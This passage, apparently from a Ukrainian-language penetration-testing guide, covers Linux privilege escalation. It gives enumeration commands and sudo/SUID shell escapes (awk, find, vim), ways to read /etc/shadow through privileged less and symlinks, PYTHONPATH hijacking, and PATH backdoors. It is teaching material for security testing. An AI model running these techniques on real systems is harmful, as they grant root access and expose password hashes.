–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É **`ctr`**, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –Ω–µ—é –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ **RunC**

–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É **`runc`**, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –Ω–µ—é –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus - —Ü–µ —Å–∫–ª–∞–¥–Ω–∞ **—Å–∏—Å—Ç–µ–º–∞ –º—ñ–∂–ø—Ä–æ—Ü–µ—Å–Ω–æ–≥–æ –∑–≤'—è–∑–∫—É (IPC)**, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –ø—Ä–æ–≥—Ä–∞–º–∞–º –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ —Ç–∞ –æ–±–º—ñ–Ω—é–≤–∞—Ç–∏—Å—è –¥–∞–Ω–∏–º–∏. –†–æ–∑—Ä–æ–±–ª–µ–Ω–∞ –∑ —É—Ä–∞—Ö—É–≤–∞–Ω–Ω—è–º —Å—É—á–∞—Å–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ Linux, –≤–æ–Ω–∞ –ø—Ä–æ–ø–æ–Ω—É—î –Ω–∞–¥—ñ–π–Ω–∏–π —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö —Ñ–æ—Ä–º –≤–∑–∞—î–º–æ–¥—ñ—ó –ø—Ä–æ–≥—Ä–∞–º.

–°–∏—Å—Ç–µ–º–∞ —î —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ—é, –ø—ñ–¥—Ç—Ä–∏–º—É—é—á–∏ –±–∞–∑–æ–≤–∏–π IPC, —è–∫–∏–π –ø–æ–ª–µ–≥—à—É—î –æ–±–º—ñ–Ω –¥–∞–Ω–∏–º–∏ –º—ñ–∂ –ø—Ä–æ—Ü–µ—Å–∞–º–∏, –Ω–∞–≥–∞–¥—É—é—á–∏ –ø—Ä–æ –ø–æ–∫—Ä–∞—â–µ–Ω—ñ UNIX-—Å–æ–∫–µ—Ç–∏. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤–æ–Ω–∞ –¥–æ–ø–æ–º–∞–≥–∞—î –≤ —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—ó –ø–æ–¥—ñ–π –∞–±–æ —Å–∏–≥–Ω–∞–ª—ñ–≤, —Å–ø—Ä–∏—è—é—á–∏ –±–µ–∑—à–æ–≤–Ω—ñ–π —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –º—ñ–∂ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏ —Å–∏—Å—Ç–µ–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–∏–≥–Ω–∞–ª –≤—ñ–¥ –¥–µ–º–æ–Ω–∞ Bluetooth –ø—Ä–æ –≤—Ö—ñ–¥–Ω–∏–π –¥–∑–≤—ñ–Ω–æ–∫ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø—Ä–∏–≥–ª—É—à–µ–Ω–Ω—è –º—É–∑–∏—á–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–≤–∞—á–∞, –ø–æ–∫—Ä–∞—â—É—é—á–∏ –≤–∑–∞—î–º–æ–¥—ñ—é –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º. –ö—Ä—ñ–º —Ç–æ–≥–æ, D-Bus –ø—ñ–¥—Ç—Ä–∏–º—É—î –≤—ñ–¥–¥–∞–ª–µ–Ω—É —Å–∏—Å—Ç–µ–º—É –æ–±'—î–∫—Ç—ñ–≤, —Å–ø—Ä–æ—â—É—é—á–∏ –∑–∞–ø–∏—Ç–∏ —Å–ª—É–∂–± —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ –º–µ—Ç–æ–¥—ñ–≤ –º—ñ–∂ –¥–æ–¥–∞—Ç–∫–∞–º–∏, —Å–ø—Ä–æ—â—É—é—á–∏ –ø—Ä–æ—Ü–µ—Å–∏, —è–∫—ñ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω–æ –±—É–ª–∏ —Å–∫–ª–∞–¥–Ω–∏–º–∏.

D-Bus –ø—Ä–∞—Ü—é—î –∑–∞ –º–æ–¥–µ–ª–ª—é **–¥–æ–∑–≤–æ–ª–∏—Ç–∏/–∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏**, –∫–µ—Ä—É—é—á–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å (–≤–∏–∫–ª–∏–∫–∏ –º–µ—Ç–æ–¥—ñ–≤, –µ–º—ñ—Å—ñ—ó —Å–∏–≥–Ω–∞–ª—ñ–≤ —ñ —Ç. –¥.) –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∫—É–º—É–ª—è—Ç–∏–≤–Ω–æ–≥–æ –µ—Ñ–µ–∫—Ç—É –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ –ø–æ–ª—ñ—Ç–∏—á–Ω–∏–º –ø—Ä–∞–≤–∏–ª–∞–º. –¶—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –≤–∫–∞–∑—É—é—Ç—å –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∞–≤—Ç–æ–±—É—Å–æ–º, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é —Ü–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤.

–ù–∞–≤–µ–¥–µ–Ω–æ –ø—Ä–∏–∫–ª–∞–¥ —Ç–∞–∫–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏ –≤ `/etc/dbus-1/system.d/wpa_supplicant.conf`, –¥–µ –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å–∞–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ root –Ω–∞ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –≤—ñ–¥ `fi.w1.wpa_supplicant1`.

–ü–æ–ª—ñ—Ç–∏–∫–∏ –±–µ–∑ –≤–∫–∞–∑–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –≥—Ä—É–ø–∏ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ, —Ç–æ–¥—ñ —è–∫ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É "default" –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è –¥–æ –≤—Å—ñ—Ö, –∫–æ–≥–æ –Ω–µ –æ—Ö–æ–ø–ª—é—é—Ç—å —ñ–Ω—à—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è, —è–∫ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é D-Bus —Ç—É—Ç:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **–ú–µ—Ä–µ–∂–∞**

–ó–∞–≤–∂–¥–∏ —Ü—ñ–∫–∞–≤–æ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –º–µ—Ä–µ–∂—É —Ç–∞ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –ø–æ–ª–æ–∂–µ–Ω–Ω—è –º–∞—à–∏–Ω–∏.

### –ó–∞–≥–∞–ª—å–Ω–µ –ø–µ—Ä–µ–ª—ñ—á–µ–Ω–Ω—è
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### –í—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏

–ó–∞–≤–∂–¥–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –º–µ—Ä–µ–∂–µ–≤—ñ —Å–ª—É–∂–±–∏, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –º–∞—à–∏–Ω—ñ, –∑ —è–∫–æ—é –≤–∏ –Ω–µ –º–æ–≥–ª–∏ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –¥–æ –¥–æ—Å—Ç—É–ø—É –¥–æ –Ω–µ—ó:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### –ü—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —Ç—Ä–∞—Ñ—ñ–∫. –Ø–∫—â–æ –º–æ–∂–µ—Ç–µ, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ.
```
timeout 1 tcpdump
```
## –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

### –ó–∞–≥–∞–ª—å–Ω–µ –ø–µ—Ä–µ–ª—ñ—á–µ–Ω–Ω—è

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **—Ö—Ç–æ** –≤–∏ —î, —è–∫—ñ **–ø—Ä–∏–≤—ñ–ª–µ—ó** —É –≤–∞—Å —î, —è–∫—ñ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —î –≤ —Å–∏—Å—Ç–µ–º–∞—Ö, —è–∫—ñ –∑ –Ω–∏—Ö –º–æ–∂—É—Ç—å **—É–≤—ñ–π—Ç–∏** —ñ —è–∫—ñ –º–∞—é—Ç—å **root-–ø—Ä–∏–≤—ñ–ª–µ—ó:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### –í–µ–ª–∏–∫–∏–π UID

–î–µ—è–∫—ñ –≤–µ—Ä—Å—ñ—ó Linux –±—É–ª–∏ –ø–æ—Ä—É—à–µ–Ω—ñ –±–∞–≥–æ–º, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ **UID > INT\_MAX** –ø—ñ–¥–≤–∏—â—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó. –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è: [—Ç—É—Ç](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [—Ç—É—Ç](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) —Ç–∞ [—Ç—É—Ç](https://twitter.com/paragonsec/status/1071152249529884674).\
**–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ü–µ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: **`systemd-run -t /bin/bash`**

### –ì—Ä—É–ø–∏

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –≤–∏ —î **—á–ª–µ–Ω–æ–º —è–∫–æ—ó-–Ω–µ–±—É–¥—å –≥—Ä—É–ø–∏**, —è–∫–∞ –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ –≤–∞–º –ø—Ä–∏–≤—ñ–ª–µ—ó root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### –ë—É—Ñ–µ—Ä –æ–±–º—ñ–Ω—É

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —î —â–æ—Å—å —Ü—ñ–∫–∞–≤–µ –≤ –±—É—Ñ–µ—Ä—ñ –æ–±–º—ñ–Ω—É (—è–∫—â–æ —Ü–µ –º–æ–∂–ª–∏–≤–æ)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### –ü–æ–ª—ñ—Ç–∏–∫–∞ –ø–∞—Ä–æ–ª—ñ–≤
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### –í—ñ–¥–æ–º—ñ –ø–∞—Ä–æ–ª—ñ

–Ø–∫—â–æ –≤–∏ **–∑–Ω–∞—î—Ç–µ –±—É–¥—å-—è–∫–∏–π –ø–∞—Ä–æ–ª—å** —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, **—Å–ø—Ä–æ–±—É–π—Ç–µ —É–≤—ñ–π—Ç–∏ —è–∫ –∫–æ–∂–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π –ø–∞—Ä–æ–ª—å.

### Su Brute

–Ø–∫—â–æ –≤–∞–º –Ω–µ –∑–∞–≤–∞–∂–∞—î —Ä–æ–±–∏—Ç–∏ –±–∞–≥–∞—Ç–æ —à—É–º—É —ñ –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ –ø—Ä–∏—Å—É—Ç–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ `su` —Ç–∞ `timeout`, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏ –ø–µ—Ä–µ–±—ñ—Ä –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `-a` —Ç–∞–∫–æ–∂ —Å–ø—Ä–æ–±—É—î –≤–∏–∫–æ–Ω–∞—Ç–∏ –ø–µ—Ä–µ–±—ñ—Ä –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Å—É—î–º–∏–º–∏ —à–ª—è—Ö–∞–º–∏

### $PATH

–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–µ—è–∫–æ—ó –ø–∞–ø–∫–∏ $PATH**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–Ω—è—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ –∑–∞–¥–Ω—ñ–π –ø—Ä–æ—Ö—ñ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–∞–ø–∏—Å—É—î–º–æ—ó –ø–∞–ø–∫–∏ –∑ —ñ–º'—è–º —è–∫–æ—ó—Å—å –∫–æ–º–∞–Ω–¥–∏, —è–∫–∞ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞ —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º (—ñ–¥–µ–∞–ª—å–Ω–æ root) —ñ —è–∫–∞ **–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ –ø–∞–ø–∫–∏, —â–æ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∞ –ø–µ—Ä–µ–¥ –≤–∞—à–æ—é –∑–∞–ø–∏—Å—É—î–º–æ—é –ø–∞–ø–∫–æ—é –≤ $PATH**.

### SUDO —Ç–∞ SUID

–í–∞–º –º–æ–∂–µ –±—É—Ç–∏ –¥–æ–∑–≤–æ–ª–µ–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–µ—è–∫—É –∫–æ–º–∞–Ω–¥—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é sudo –∞–±–æ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –±—ñ—Ç suid. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
–î–µ—è–∫—ñ **–Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∞–º —á–∏—Ç–∞—Ç–∏ —Ç–∞/–∞–±–æ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É.** –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è Sudo –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ –∫–æ–º–∞–Ω–¥–∏ –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±–µ–∑ –≤–≤–µ–¥–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á `demo` –º–æ–∂–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏ `vim` —è–∫ `root`, —Ç–µ–ø–µ—Ä –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É —Å—Ç–∞—î —Ç—Ä–∏–≤—ñ–∞–ª—å–Ω–æ, –¥–æ–¥–∞–≤—à–∏ –∫–ª—é—á ssh —É –∫–∞—Ç–∞–ª–æ–≥ `root` –∞–±–æ –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ `sh`.
```
sudo vim -c '!sh'
```
### SETENV

–¶—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–æ–≥–æ-–Ω–µ–±—É–¥—å:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥, **–∑–∞—Å–Ω–æ–≤–∞–Ω–∏–π –Ω–∞ –º–∞—à–∏–Ω—ñ HTB Admirer**, –±—É–≤ **—É—Ä–∞–∑–ª–∏–≤–∏–π** –Ω–∞ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è PYTHONPATH –¥–ª—è –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è** –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ Python –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—É —è–∫ root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### –û–±—Ö—ñ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–µ—Ä–µ–∑ Sudo, –æ–±—Ö–æ–¥—è—á–∏ —à–ª—è—Ö–∏

**–ü–µ—Ä–µ—Å–∫–æ—á—ñ—Ç—å**, —â–æ–± –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —ñ–Ω—à—ñ —Ñ–∞–π–ª–∏ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **—Å–∏–º–≤–æ–ª—ñ—á–Ω—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É —Ñ–∞–π–ª—ñ sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **–∑—ñ—Ä–æ—á–∫–∞** (\*), —Ü–µ —â–µ –ø—Ä–æ—Å—Ç—ñ—à–µ:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**–ü—Ä–æ—Ç–∏–ø—Ä–∞–≤–Ω—ñ –¥—ñ—ó**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### –ö–æ–º–∞–Ω–¥–∞ Sudo/SUID-–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –±–µ–∑ —à–ª—è—Ö—É –¥–æ –∫–æ–º–∞–Ω–¥–∏

–Ø–∫—â–æ **–¥–æ–∑–≤—ñ–ª sudo** –Ω–∞–¥–∞–Ω–æ –¥–ª—è –æ–¥–Ω—ñ—î—ó –∫–æ–º–∞–Ω–¥–∏ **–±–µ–∑ –≤–∫–∞–∑–∞–Ω–Ω—è —à–ª—è—Ö—É**: _hacker10 ALL= (root) less_, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ, –∑–º—ñ–Ω–∏–≤—à–∏ –∑–º—ñ–Ω–Ω—É PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞, —è–∫—â–æ **suid** –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **–≤–∏–∫–æ–Ω—É—î —ñ–Ω—à—É –∫–æ–º–∞–Ω–¥—É –±–µ–∑ –≤–∫–∞–∑–∞–Ω–Ω—è —à–ª—è—Ö—É –¥–æ –Ω–µ—ó (–∑–∞–≤–∂–¥–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –∑** _**strings**_ **–≤–º—ñ—Å—Ç –¥–∏–≤–Ω–æ–≥–æ SUID-–±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É)**.

[–ü—Ä–∏–∫–ª–∞–¥–∏ –ø–æ–ª–µ–∑–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.](payloads-to-execute.md)

### SUID-–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑—ñ —à–ª—è—Ö–æ–º –∫–æ–º–∞–Ω–¥–∏

–Ø–∫—â–æ **suid** –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **–≤–∏–∫–æ–Ω—É—î —ñ–Ω—à—É –∫–æ–º–∞–Ω–¥—É, –≤–∫–∞–∑—É—é—á–∏ —à–ª—è—Ö**, —Ç–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é**, —è–∫–∞ –º–∞—î —Ç–∞–∫—É –∂ –Ω–∞–∑–≤—É, —è–∫ –∫–æ–º–∞–Ω–¥–∞, —è–∫—É –≤–∏–∫–ª–∏–∫–∞—î —Ñ–∞–π–ª suid.

